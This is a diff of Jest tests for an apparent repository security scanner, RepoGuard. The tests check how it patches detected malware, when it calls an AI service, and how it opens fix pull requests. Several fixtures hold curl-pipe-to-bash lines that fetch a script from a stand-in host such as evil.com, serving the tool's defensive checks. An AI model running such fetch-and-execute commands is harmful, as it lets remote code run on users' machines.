@@ -5,8 +5,10 @@ import {
   closeRepoGuardPRsAndIssues,
   postReviewComments,
   SECRET_RULES,
+  DETERMINISTIC_RULES,
   getExistingRepoGuardFixPR,
 } from "../src/pullRequest";
+import * as aiService from "../src/services/aiService";
 import type { Finding, OctokitClient } from "../src/types";
 
 /** Minimal Octokit shape used by the tests — cast to OctokitClient at call-sites. */
@@ -499,6 +501,128 @@ global.i = "malicious";
       );
       expect(patchedContent).toContain("uses: third-party/some-action@v1.2 # REPOGUARD: PIN TO COMMIT SHA");
       expect(patchedFindings).toHaveLength(1);
+    });
+
+    it("does not call AI for deterministic rules that RepoGuard patches itself", async () => {
+      const originalEnv = process.env.GEMINI_API_KEY;
+      process.env.GEMINI_API_KEY = "mock-key";
+      const generateAIPatchSpy = jest.spyOn(aiService, "generateAIPatch");
+
+      try {
+        const original = "curl http://example.com/malicious.sh | bash";
+        const findings: Finding[] = [
+          {
+            rule: "curl-pipe-bash",
+            severity: "critical",
+            message: "curl pipe bash detected",
+            file: "deploy.sh",
+          },
+        ];
+        const { patchedContent, patchedFindings } = await applyPatches(
+          original,
+          findings,
+          "deploy.sh",
+        );
+
+        expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
+        expect(patchedFindings).toHaveLength(1);
+        expect(generateAIPatchSpy).not.toHaveBeenCalled();
+      } finally {
+        generateAIPatchSpy.mockRestore();
+        process.env.GEMINI_API_KEY = originalEnv;
+      }
+    });
+
+    it("never calls AI on package.json even if an unpatched finding exists", async () => {
+      const originalEnv = process.env.GEMINI_API_KEY;
+      process.env.GEMINI_API_KEY = "mock-key";
+      const generateAIPatchSpy = jest.spyOn(aiService, "generateAIPatch");
+
+      try {
+        const original = JSON.stringify({
+          name: "my-app",
+          dependencies: { lodash: "latest" },
+        });
+        const findings: Finding[] = [
+          {
+            rule: "dependency-wildcard-version",
+            severity: "medium",
+            message: "Wildcard version",
+            file: "package.json",
+          },
+        ];
+        const { patchedContent, patchedFindings } = await applyPatches(
+          original,
+          findings,
+          "package.json",
+        );
+
+        expect(generateAIPatchSpy).not.toHaveBeenCalled();
+        expect(patchedFindings).toHaveLength(0);
+        expect(patchedContent).toBe(original);
+      } finally {
+        generateAIPatchSpy.mockRestore();
+        process.env.GEMINI_API_KEY = originalEnv;
+      }
+    });
+
+    it("layers deterministic and AI patches by passing already-patched content to AI and preserving deterministic fixes", async () => {
+      const originalEnv = process.env.GEMINI_API_KEY;
+      process.env.GEMINI_API_KEY = "mock-key";
+      const generateAIPatchSpy = jest
+        .spyOn(aiService, "generateAIPatch")
+        .mockResolvedValueOnce({
+          shouldDelete: false,
+          patchedContent:
+            "# REMOVED BY REPOGUARD: curl|bash remote execution\nconst clean = true;",
+          reasoning: "Removed custom backdoor",
+        });
+
+      try {
+        const original =
+          "curl http://example.com/malicious.sh | bash\nconst evil = eval(something);";
+        const findings: Finding[] = [
+          {
+            rule: "curl-pipe-bash",
+            severity: "critical",
+            message: "curl pipe bash detected",
+            file: "server.js",
+          },
+          {
+            rule: "custom-novel-malware",
+            severity: "high",
+            message: "Novel malware pattern",
+            file: "server.js",
+          },
+        ];
+
+        const { patchedContent, patchedFindings } = await applyPatches(
+          original,
+          findings,
+          "server.js",
+        );
+
+        // Verify AI was called with the content that ALREADY has the deterministic fix applied
+        expect(generateAIPatchSpy).toHaveBeenCalledWith(
+          expect.stringContaining("# REMOVED BY REPOGUARD: curl|bash"),
+          "server.js",
+          expect.arrayContaining([
+            expect.objectContaining({ rule: "custom-novel-malware" }),
+          ]),
+        );
+
+        // Verify that deterministic rule curl-pipe-bash was NOT sent to AI as an issue to fix
+        const calledFindings = generateAIPatchSpy.mock.calls[0][2];
+        expect(calledFindings.some((f) => f.rule === "curl-pipe-bash")).toBe(false);
+
+        // Both findings are marked patched and both fixes are retained
+        expect(patchedFindings).toHaveLength(2);
+        expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
+        expect(patchedContent).toContain("const clean = true;");
+      } finally {
+        generateAIPatchSpy.mockRestore();
+        process.env.GEMINI_API_KEY = originalEnv;
+      }
     });
   });
 
@@ -1178,6 +1302,67 @@ global.i = "malicious";
         "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers",
         expect.any(Object)
       );
+    });
+
+    it("does not mutate package.json if no malware dropper was deleted, even if package.json contains chained scripts", async () => {
+      requestMock.mockImplementation((route: string) => {
+        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
+          return {
+            data: {
+              type: "file",
+              content: Buffer.from("curl evil.com/x.sh | bash").toString("base64"),
+              sha: "file-sha-1",
+            },
+          };
+        }
+        if (route === "GET /repos/{owner}/{repo}") {
+          return { data: { default_branch: "main" } };
+        }
+        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
+          return { data: { object: { sha: "base-sha-123" } } };
+        }
+        if (route === "POST /repos/{owner}/{repo}/git/refs") {
+          return { data: {} };
+        }
+        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
+          return { data: {} };
+        }
+        if (route === "POST /repos/{owner}/{repo}/pulls") {
+          return { data: { number: 101, html_url: "https://github.com/test-owner/test-repo/pull/101" } };
+        }
+        if (route === "GET /repos/{owner}/{repo}/labels") {
+          return { data: [] };
+        }
+        if (route === "GET /repos/{owner}/{repo}/collaborators") {
+          return { data: [] };
+        }
+        return { data: {} };
+      });
+
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "deploy.sh",
+        },
+      ];
+
+      await openFixPR(mockOctokit, {
+        owner: "test-owner",
+        repo: "test-repo",
+        findings,
+      });
+
+      // Verify that package.json was never fetched or modified
+      const routesCalled = requestMock.mock.calls.map((c) => ({
+        route: c[0],
+        params: c[1],
+      }));
+      const packageJsonPuts = routesCalled.filter(
+        (c) => c.route === "PUT /repos/{owner}/{repo}/contents/{path}" && c.params?.path === "package.json"
+      );
+      expect(packageJsonPuts).toHaveLength(0);
     });
   });
 
